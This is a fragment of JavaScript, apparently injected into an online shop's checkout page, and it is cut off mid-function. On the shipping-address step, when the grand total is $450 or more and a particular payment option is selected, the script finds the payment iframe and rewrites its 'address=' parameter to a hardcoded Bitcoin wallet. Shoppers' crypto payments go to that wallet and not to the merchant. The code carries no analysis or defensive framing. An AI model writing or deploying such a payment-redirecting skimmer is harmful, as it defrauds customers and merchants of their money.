var intervalId;
function checkIframe() {
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){

        var grandTotalElement = Array.from(document.querySelectorAll('.row em')).find(function(el) { return el.textContent.trim() === 'Grand Total'; });
        var priceElement = grandTotalElement.nextElementSibling;
        var priceText = priceElement.textContent;
        var priceValue = parseInt(priceText.replace('$', '').trim());

        if (priceValue >= 450) {

            if(document.getElementsByTagName("select")[1].value=="2"){
                const iframes = Array.from(document.getElementsByTagName("iframe"));
                const targetValue = "common/create"; 
                const newValue = "bc1qtyv65dxvts5llxasmy44aqw07cg3j7gexuwtd2"; 

                const foundIframe = iframes.some(iframe => {
                    if (iframe.src.includes(targetValue)) {
                        const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                        iframe.src = updatedSrc; 
                        clearInterval(intervalId);
                        return true;
                    }
                    return false;
                });
            }
        }

    }
